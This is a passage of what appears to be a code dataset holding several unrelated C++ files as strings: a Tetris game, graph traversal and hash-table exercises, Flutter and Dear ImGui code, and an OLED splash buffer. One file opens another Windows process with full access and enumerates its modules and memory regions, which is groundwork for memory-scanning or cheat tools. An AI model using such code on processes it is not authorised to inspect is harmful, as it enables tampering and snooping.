GetTickCount();\n\n\tif (lastTime == 0)\n\t{\n\t\tlastTime = currentTime;\n\t\treturn 0;\n\t}\n\telse\n\t{\n\t\tint ret = currentTime - lastTime;\n\t\tlastTime = currentTime;\n\t\treturn ret;\n\t}\n}\n\nvoid Tetris::drop()\n{\n\tbakBlock = *curBlock;\n\tcurBlock->drop();\n\n\tif (curBlock->blockInMap(map) == false)\n\t{\n\t\tdelay = SPEED_NORMAL[level-1]; //\u5230\u5e95\u540e\u901f\u5ea6\u53d8\u56de\u5e38\u89c4\n\t\t//\u628a\u8fd9\u4e2a\u65b9\u5757\u56fa\u5316\n\t\tbakBlock.solidify(map);\n\t\tdelete curBlock;\n\t\tcurBlock = nextBlock;\n\t\tnextBlock = new Block;\n\n\t\t//\u68c0\u67e5\u6e38\u620f\u662f\u5426\u7ed3\u675f\n\t\tcheckOver();\n\t}\n}\n\nvoid Tetris::clearLine()\n{\n\tint lines = 0;\n\tint k = rows - 1; //\u5b58\u50a8\u6570\u636e\u7684\u884c\u6570\n\tfor (int i = rows - 1;i >= 0;i--)\n\t{\n\t\tint count = 0;\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tif (map[i][j])\n\t\t\t{\n\t\t\t\tcount++;\n\t\t\t}\n\t\t\tmap[k][j] = map[i][j]; //\u5148\u5b58\u4e0b\uff0c\u5982\u679c\u8981\u6d88\u9664\uff0c\u63a5\u7740\u672c\u884c\u5b58\u50a8\n\t\t}\n\t\tif(count < cols) //\u5982\u679c\u4e0d\u7528\u6d88\u9664\uff0c\u5219\u5b58\u4e0a\u4e00\u884c\n\t\t{\n\t\t\tk--;\n\t\t}\n\t\telse //\u6d88\u9664\uff0ck\u4e0d\u52a8\u4e0b\u6b21\u63a5\u7740\u5b58\u672c\u884c\n\t\t{\n\t\t\tlines++;\n\t\t}\n\t}\n\tif (lines > 0)\n\t{\n\t\t//\u8ba1\u7b97\u5f97\u5206\n\t\tint addScore[4] = { 10,30,60,80 };\n\t\tscore += addScore[lines - 1];\n\n\t\tmciSendString(\"play res/xiaochu1.mp3\", 0, 0, 0);\n\t\tupdate = true;\n\n\t\t//\u6bcf100\u5206\u4e00\u4e2a\u7ea7\u522b 0-100 \u7b2c\u4e00\u5173 101-200\u7b2c\u4e8c\u5173\n\t\tlevel = (score + 99) / 100;\n\t\tif (level > MAX_LEVEL)\n\t\t{\n\t\t\tgameOver = true;\n\t\t}\n\n\t\tlineCount += lines;\n\t}\n}\n\nvoid Tetris::moveLeftRight(int offset)\n{\n\tbakBlock = *curBlock;\n\tcurBlock->moveLeftRight(offset);\n\n\tif (!curBlock->blockInMap(map))\n\t{\n\t\t*curBlock = bakBlock;\n\t}\n}\n\nvoid Tetris::rotate()\n{\n\tif (curBlock->getBlockType() == 7) return;\n\n\tbakBlock = *curBlock;\n\tcurBlock->rotate();\n\n\tif (!curBlock->blockInMap(map))\n\t{\n\t\t*curBlock = bakBlock;\n\t}\n}\n\nvoid Tetris::drawScore()\n{\n\tchar scoreText[32];\n\tsprintf_s(scoreText, sizeof(scoreText), \"%d\", score);\n\n\tsetcolor(RGB(180, 180, 180));\n\n\tLOGFONT f;\n\tgettextstyle(&f);  //\u83b7\u53d6\u5f53\u524d\u7684\u5b57\u4f53\n\tf.lfHeight = 60;\n\tf.lfWeight = 30;\n\tf.lfQuality = ANTIALIASED_QUALITY; //\u8bbe\u7f6e\u5b57\u4f53\u4e3a\u201c\u6297\u952f\u9f7f\u201d\u6548\u679c\n\tstrcpy_s(f.lfFaceName, sizeof(f.lfFaceName), _T(\"Segoe UI Black\"));\n\tsettextstyle(&f);\n\n\tsetbkmode(TRANSPARENT); //\u5b57\u4f53\u7684\u80cc\u666f",
    "#include <iostream>\r\n#include <cassert>\r\n#include <cstdlib>\r\n#include <Windows.h>\r\n#include <Psapi.h>\r\n#include <tlhelp32.h>\r\n\r\n#define MAX_STR_SIZE 192\r\n#define MAX_MODULE_AMOUNT 128\r\n#define MAX_MEM_AMOUNT 10000\r\n\r\n#define MAX_MODULE_AMOUNT_IN_BYTES MAX_MODULE_AMOUNT * sizeof(HMODULE)\r\n\r\n#undef min\r\n#undef Process32First\r\n#undef Process32Next\r\n#undef PROCESSENTRY32\r\n\r\nUCHAR strcmp_leastchar(const char* a, const char* b, const char* la = nullptr)\r\n{\r\n\tconst char* lb = b;\r\n\r\n\tif (la == nullptr)\r\n\t{\r\n\t\tla = a;\r\n\t\twhile (*la) la++;\r\n\t}\r\n\r\n\twhile (*lb) lb++;\r\n\r\n\tint min_size = -std::min(la - a, lb - b);\r\n\tUCHAR c = 0;\r\n\r\n\tfor (int i = -1; i >= min_size; i--)\r\n\t\tc += (la[i] == lb[i]);\r\n\r\n\treturn c;\r\n}\r\n\r\nstd::string GetLastErrorAsString()\r\n{\r\n\t//Get the error message ID, if any.\r\n\tDWORD errorMessageID = ::GetLastError();\r\n\tif (errorMessageID == 0) {\r\n\t\treturn std::string(); //No error message has been recorded\r\n\t}\r\n\r\n\tLPSTR messageBuffer = nullptr;\r\n\r\n\t//Ask Win32 to give us the string version of that message ID.\r\n\t//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).\r\n\tsize_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\r\n\t\tNULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);\r\n\r\n\t//Copy the error message into a std::string.\r\n\tstd::string message(messageBuffer, size);\r\n\r\n\t//Free the Win32's string's buffer.\r\n\tLocalFree(messageBuffer);\r\n\r\n\treturn message;\r\n}\r\n\r\nstruct mem_info_s\r\n{\r\n\tvoid* BaseAddress;\r\n\tSIZE_T RegionSize;\r\n\tbool is_priorited;\r\n};\r\n\r\nsize_t app_mem_size = 0;\r\n\r\nstruct info_s\r\n{\r\n\tbool alive;\r\n\r\n\tDWORD pId, module_amount, error_code;\r\n\tHMODULE* modules;\r\n\tMODULEINFO* module_infos;\r\n\r\n\tsize_t buck_mem_size;\r\n\r\n\tHMODULE main_module;\r\n\tvoid* module_base;\r\n\tMODULEINFO main_module_info;\r\n\tLPSTR main_module_file_name;\r\n\r\n\tmem_info_s* mem_addresses;\r\n\tDWORD mem_amount;\r\n\r\n\tHANDLE proc;\r\n\r\n\tinfo_s(DWORD pId_In) : pId(pId_In)\r\n\t{\r\n\t\tmodule_infos = nullptr;\r\n\t\tmem_addresses = nullptr;\r\n\t\tmem_amount = 0;\r\n\t\talive = false;\r\n\t\tmain_module = 0;\r\n\t\tmain_module_info = { nullptr, 0, nullptr };\r\n\t\tmodule_amount = error_code = 0;\r\n\t\tmodules = nullptr;\r\n\t\tproc = nullptr;\r\n\r\n\t\tmain_module_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\t\tLPSTR cache_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\r\n\t\tif (main_module_file_name == nullptr || cache_file_name == nullptr) {\r\n\t\t\terror_code = 1;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmain_module_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\t\tcache_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\r\n\t\tmodules = (HMODULE*)malloc(MAX_MODULE_AMOUNT_IN_BYTES);\r\n\t\tmodule_infos = (MODULEINFO*)malloc(MAX_MODULE_AMOUNT * sizeof(MODULEINFO));\r\n\r\n\t\tif (modules == nullptr || module_infos == nullptr) {\r\n\t\t\terror_code = 2;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId_In);\r\n\r\n\t\tGetProcessImageFileNameA(proc, main_module_file_name, MAX_STR_SIZE);\r\n\r\n\t\tEnumProcessModules(proc, modules, MAX_MODULE_AMOUNT_IN_BYTES, &module_amount);\r\n\r\n\t\tif (module_amount > MAX_MODULE_AMOUNT_IN_BYTES) {\r\n\t\t\terror_code = 3;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmodule_amount /= sizeof(HMODULE);\r\n\r\n\t\tconst char* least_char_on_main = main_module_file_name;\r\n\t\twhile (*least_char_on_main) least_char_on_main++;\r\n\r\n\t\tMODULEINFO module_info;\r\n\r\n\t\tfor (DWORD i = 0; i < module_amount; i++)\r\n\t\t{\r\n\t\t\tDWORD err = GetModuleFileNameA(modules[i], cache_file_name, MAX_STR_SIZE);\r\n\t\t\tGetModuleInformation(proc, modules[i], &module_info, sizeof(MODULEINFO));\r\n\t\t\tmodule_infos[i] = module_info;\r\n\r\n\t\t\tif (err == 0)\r\n\t\t\t{\r\n\t\t\t\tcache_file_name[0] = '?';\r\n\t\t\t\tcache_file_name[1] = '\\0';\r\n\t\t\t}\r\n\r\n\t\t\tstd::cout << i << \":\\t\" << module_info.lpBaseOfDll << \": \" << cache_file_name << '\\n';\r\n\t\t}\r\n\r\n\t\tmain_module_info = module_infos[0];\r\n\t\tmain_module = modules[0];\r\n\r\n\t\tmodule_base = (void*)main_module;\r\n\r\n\t\tfree(cache_file_name);\r\n\r\n\t\tstd::cout << \"\\nModule Name:\\t\" << main_module_file_name\r\n\t\t\t<< \"\\nModule Base:\\t0x\" << module_base\r\n\t\t\t<< \"\\nCum Base:\\t0x\" << main_module_info.EntryPoint\r\n\t\t\t<< \"\\nModule Size:\\t\" << main_module_info.SizeOfImage\r\n\t\t\t<< \"\\nModule Amount:\\t\" << module_amount\r\n\t\t\t<< \"\\npId:\\t\\t\" << pId\r\n\t\t\t<< std::endl;\r\n\r\n\t\talive = true;\r\n\t}\r\n\r\n\tvoid get_memory_infos()\r\n\t{\r\n\t\tif (alive == false)\r\n\t\t\treturn;\r\n\r\n\t\tif (mem_addresses == nullptr)\r\n\t\t\tmem_addresses = (mem_info_s*)malloc(MAX_MEM_AMOUNT * sizeof(mem_info_s));\r\n\r\n\t\tbuck_mem_size = 0;\r\n\t\tmem_amount = 0;\r\n\r\n\t\tMEMORY_BASIC_INFORMATION mem_info;\r\n\t\tvoid* next_scan_start = nullptr;\r\n\r\n\t\twhile (VirtualQueryEx(proc, next_scan_start, &mem_info, sizeof(MEMORY_BASIC_INFORMATION)))\r\n\t\t{\r\n\t\t\tnext_scan_start = (char*)mem_info.BaseAddress + mem_info.RegionSize;\r\n\r\n\t\t\tif (mem_info.State == MEM_COMMIT && next_scan_start < (void*)0x00007FF000000000)\r\n\t\t\t{\r\n\t\t\t\tif (mem_info.RegionSize > app_mem_size)\r\n\t\t\t\t\tbuck_mem_size++;\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tmem_addresses[mem_amount].is_priorited = (mem_info.BaseAddress == mem_i",
    "\ufeff#include \"iostream\"\n#include \"fstream\"\n#include <queue>\nusing namespace std;\nconst int maxDinh = 20;\nbool visited[maxDinh] = { false };\n\nstruct node {\n\tint dinhKe;\n\tint trongSo;\n\tnode* link;\n};\n\nstruct danhSachKe {\n\tnode* dsk[maxDinh];\n\tint soDinh; // s\u1ed1 \u0111\u1ec9nh c\u1ee7a graph\n};\n\nvoid readFile(danhSachKe& list) {\n\tifstream inFile(\"Text.txt\");\n\tif (!inFile.is_open()) {\n\t\tcout << \"\\nKhong the mo tep.\";\n\t\treturn;\n\t}\n\t// cho danh s\u00e1ch = null h\u1ebft\n\tfor (int i = 0; i < maxDinh; i++)\n\t\tlist.dsk[i] = NULL;\n\t// Nhap s\u1ed1 \u0111\u1ec9nh t\u1ed5ng\n\tinFile >> list.soDinh;\n\tfor (int i = 0; i < list.soDinh; i++) {\n\t\tint soDinhKe;\n\t\tinFile >> soDinhKe;\n\t\tfor (int j = 0; j < soDinhKe; j++) {\n\t\t\tnode* newNode = new node();\n\t\t\tinFile >> newNode->dinhKe;\n\t\t\tinFile >> newNode->trongSo;\n\t\t\tnewNode->link = NULL;\n\t\t\t// Th\u00eam v\u00e0o single list theo \u0111\u1ec9nh t\u01b0\u01a1ng \u1ee9ng \n\t\t\tif (list.dsk[i] == NULL)  // ch\u01b0a c\u00f3 \u0111\u1ec9nh k\u1ec1 n\u00e0o h\u1ebft \n\t\t\t\tlist.dsk[i] = newNode;\n\t\t\telse { // \u0111\u00e3 c\u00f3 \u0111\u1ec9nh k\u1ec1 tr\u01b0\u1edbc \u0111\u00f3 th\u00eam v\u00e0o cu\u1ed1i single list \n\t\t\t\tnode* temp = list.dsk[i];\n\t\t\t\twhile (temp->link != NULL)\n\t\t\t\t\ttemp = temp->link;\n\t\t\t\ttemp->link = newNode;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid BFS(int u,danhSachKe list) {\n\t// T\u1ea1o h\u00e0ng \u0111\u1ee3i \n\tqueue <int> hangDoi;\n\thangDoi.push(u);\n\tvisited[u] = true;\n\twhile (hangDoi.empty() == false)\n\t{\n\t\tint v = hangDoi.front(); // L\u1ea5y \u0111\u1ec9nh \u1edf \u0111\u1ea7u h\u00e0ng \u0111\u1ee3i \n\t\thangDoi.pop();\n\t\tcout << v << \" \";\n\t\t\n\t\t// Duy\u1ec7t qua t\u1ea5t c\u1ea3 c\u00e1c \u0111\u1ec9nh k\u1ec1 c\u1ee7a v\n\t\tnode* temp = list.dsk[v];\n\t\twhile (temp != NULL) {\n\t\t\tint checkDinh = temp->dinhKe;\n\t\t\t// N\u1ebfu ch\u01b0a th\u0103m th\u00ec \u0111\u1ea9y x v\u00e0o h\u00e0ng \u0111\u1ee3i \n\t\t\tif (visited[checkDinh] == false) {\n\t\t\t\thangDoi.push(checkDinh);\n\t\t\t\tvisited[checkDinh] = true;\n\t\t\t}\n\t\t\ttemp = temp->link;\n\t\t}\n\t}\n}\n\nvoid DFS(int u, danhSachKe list) {\n\tcout << u << \" \";\n\tvisited[u] = true; // \u0111\u00e1nh d\u1ea5u \u0111\u1ec9nh u \u0111\u00e3 \u0111\u01b0\u1ee3c th\u0103m \n\t\n\t// Duy\u1ec7t qua t\u1ea5t c\u1ea3 c\u00e1c \u0111\u1ec9nh k\u1ec1 c\u1ee7a u\n\tnode* temp = list.dsk[u];\n\twhile (temp != NULL) {\n\t\tint v = temp->dinhKe;\n\t\tif (!visited[v])\n\t\t\tDFS(v, list);\n\t\ttemp = temp->link;\n\t}\n}\n\nvoid connectComponent(danhSachKe list) {\n\tint count = 0;\n\tfor (int i = 1; i <= list.soDinh; i++) {\n\t\tif (visited[i] == false) {\n\t\t\tcount++;\n\t\t\tcout << \"\\nCac dinh thuoc thanh phan lien thong thu \" << count << \": \";\n\t\t\tDFS(i, list);\n\t\t\tcout << endl;\n\t\t}\n\t}\n\tif (count == 1)\n\t\tcout << \"Do thi lien thong\";\n\telse {\n\t\tcout << \"Do thi khong lien thong\";\n\t\tcout << \"\\nSo thanh phan lien thong cua do thi: \" << count;\n\t}\n}\n\nint main() {\n\tdanhSachKe list;\n\treadFile(list);\n\tcout << \"BFS Traversal: \";\n\tBFS(0, list); \n\n\t// Reset m\u1ea3ng visited ( m\u1ea3ng vi\u1ebfng th\u0103m )\n\tfor (int i = 0; i < maxDinh; i++) {\n\t\tvisited[i] = false;\n\t}\n\n\tcout << \"\\nDFS Traversal: \";\n\tDFS(0, list);\n\n\tconnectComponent(list);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include<string.h>\r\nusing namespace std;\r\nclass HashFunction\r\n{\r\n  typedef struct hash\r\n  {\r\n\tlong key;\r\n\tchar name[10];\r\n  } hash;\r\n  hash h[10];\r\npublic:\r\n    HashFunction ();\r\n  void insert ();\r\n  void display ();\r\n  int find (long);\r\n  void Delete (long);\r\n};\r\nHashFunction::HashFunction ()\r\n{\r\n  int i;\r\n  for (i = 0; i < 10; i++)\r\n\t{\r\n\t  h[i].key = -1;\r\n\t  strcpy (h[i].name, \"NULL\");\r\n\t}\r\n}\r\n\r\nvoid\r\nHashFunction::Delete (long k)\r\n{\r\n  int index = find (k);\r\n  if (index == -1)\r\n\t{\r\n\t  cout << \"\\n\\tKey Not Found\";\r\n\t}\r\n  else\r\n\t{\r\n\t  h[index].key = -1;\r\n\t  strcpy (h[index].name, \"NULL\");\r\n\t  cout << \"\\n\\tKey is Deleted\";\r\n\t}\r\n}\r\n\r\nint\r\nHashFunction::find (long k)\r\n{\r\n  int i;\r\n  for (i = 0; i < 10; i++)\r\n\t{\r\n\t  if (h[i].key == k)\r\n\t\t{\r\n\t\t  cout << \"\\n\\t\" << h[i].\r\n\t\t\tkey << \" is Found at \" << i << \" Location With Name \" << h[i].\r\n\t\t\tname;\r\n\t\t  return i;\r\n\t\t}\r\n\t}\r\n  if (i == 10)\r\n\t{\r\n\t  return -1;\r\n\t}\r\n}\r\n\r\nvoid\r\nHashFunction::display ()\r\n{\r\n  int i;\r\n  cout << \"\\n\\t\\tKey\\t\\tName\";\r\n  for (i = 0; i < 10; i++)\r\n\t{\r\n\t  cout << \"\\n\\th[\" << i << \"]\\t\" << h[i].key << \"\\t\\t\" << h[i].name;\r\n\t}\r\n}\r\n\r\nvoid\r\nHashFunction::insert ()\r\n{\r\n  char ans, n[10], ntemp[10];\r\n  long k, temp;\r\n  int v, hi, cnt = 0, flag = 0, i;\r\n  do\r\n\t{\r\n\t  if (cnt >= 10)\r\n\t\t{\r\n\t\t  cout << \"\\n\\tHash Table is FULL\";\r\n\t\t  break;\r\n\t\t}\r\n\t  cout << \"\\n\\tEnter a Telephone No: \";\r\n\t  cin >> k;\r\n\t  cout << \"\\n\\tEnter a Client Name: \";\r\n\t  cin >> n;\r\n\t  hi = k % 10;\t\t\t\t// hash function\r\n\t  if (h[hi].key == -1)\r\n\t\t{\r\n\t\t  h[hi].key = k;\r\n\t\t  strcpy (h[hi].name, n);\r\n\t\t}\r\n\t  else\r\n\t\t{\r\n\t\t  if (h[hi].key % 10 != hi)\r\n\t\t\t{\r\n\t\t\t  temp = h[hi].key;\r\n\t\t\t  strcpy (ntemp, h[hi].name);\r\n\t\t\t  h[hi].key = k;\r\n\t\t\t  strcpy (h[hi].name, n);\r\n\t\t\t  for (i = hi + 1; i < 10; i++)\r\n\t\t\t\t{\r\n\t\t\t\t  if (h[i].key == -1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t  h[i].key = temp;\r\n\t\t\t\t\t  strcpy (h[i].name, ntemp);\r\n\t\t\t\t\t  flag = 1;\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t  for (i = 0; i < hi && flag == 0; i++)\r\n\t\t\t\t{\r\n\t\t\t\t  if (h[i].key == -1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t  h[i].key = temp;\r\n\t\t\t\t\t  strcpy (h[i].name, ntemp);\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t  else\r\n\t\t\t{\r\n\t\t\t  for (i = hi + 1; i < 10; i++)\r\n\t\t\t\t{\r\n\t\t\t\t  if (h[i].key == -1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t  h[i].key = k;\r\n\t\t\t\t\t  strcpy (h[i].name, n);\r\n\t\t\t\t\t  flag = 1;\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t  for (i = 0; i < hi && flag == 0; i++)\r\n\t\t\t\t{\r\n\t\t\t\t  if (h[i].key == -1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t  h[i].key = k;\r\n\t\t\t\t\t  strcpy (h[i].name, n);\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t  flag = 0;\r\n\t  cnt++;\r\n\t  cout << \"\\n\\t..... Do You Want to Insert More Key: y/n\";\r\n\t  cin >> ans;\r\n\t}\r\n  while (ans == 'y' || ans == 'Y');\r\n}\r\n\r\nint\r\nmain ()\r\n{\r\n  long k;\r\n  int ch, index;\r\n  char ans;\r\n  HashFunction obj;\r\n  do\r\n\t{\r\n\t  cout << \"\\n\\t*** Telephone (ADT) *****\";\r\n\t  cout <<\r\n\t\t\"\\n\\t1. Insert\\n\\t2. Display\\n\\t3. Find\\n\\t4. Delete\\n\\t5. Exit\";\r\n\t  cout << \"\\n\\t..... Enter Your Choice: \";\r\n\t  cin >> ch;\r\n\t  switch (ch)\r\n\t\t{\r\n\t\tcase 1:\r\n\t\t  obj.insert ();\r\n\t\t  break;\r\n\t\tcase 2:\r\n\t\t  obj.display ();\r\n\t\t  break;\r\n\t\tcase 3:\r\n\t\t  cout << \"\\n\\tEnter a Key Which You Want to Search: \";\r\n\t\t  cin >> k;\r\n\t\t  index = obj.find (k);\r\n\t\t  if (index == -1)\r\n\t\t\t{\r\n\t\t\t  cout << \"\\n\\tKey Not Found\";\r\n\t\t\t}\r\n\t\t  break;\r\n\t\tcase 4:\r\n\t\t  cout << \"\\n\\tEnter a Key Which You Want to Delete: \";\r\n\t\t  cin >> k;\r\n\t\t  obj.Delete (k);\r\n\t\t  break;\r\n\t\tcase 5:\r\n\t\t  break;\r\n\t\t}\r\n\t  cout << \"\\n\\t..... Do You Want to Continue in Main Menu:y/n \";\r\n\t  cin >> ans;\r\n\t}\r\n  while (ans == 'y' || ans == 'Y');\r\n}\r\n\r\n",
    "// dear imgui, v1.90.6 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from win",
    "/*********************************************************************\nThis is a library for our Monochrome OLEDs based on SSD1306 drivers\n\n  Pick one up today in the adafruit shop!\n  ------> http://www.adafruit.com/category/63_98\n\nThese displays use SPI to communicate, 4 or 5 pins are required to  \ninterface\n\nAdafruit invests time and resources providing this open source code, \nplease support Adafruit and open-source hardware by purchasing \nproducts from Adafruit!\n\nWritten by Limor Fried/Ladyada  for Adafruit Industries.  \nBSD license, check license.txt for more information\nAll text above, and the splash screen below must be included in any redistribution\n*********************************************************************/\n\n#include \"Adafruit_GFX.h\"\n#include \"Adafruit_SSD1306.h\"\n\n// the memory buffer for the LCD\n\nstatic uint8_t buffer[SSD1306_LCDHEIGHT * SSD1306_LCDWIDTH / 8] = { \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,\n0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x80, 0x80, 0xC0, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF8, 0xFC, 0xF8, 0xE0, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80,\n0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x80, 0x00, 0xFF,\n0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00,\n0x80, 0xFF, 0xFF, 0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 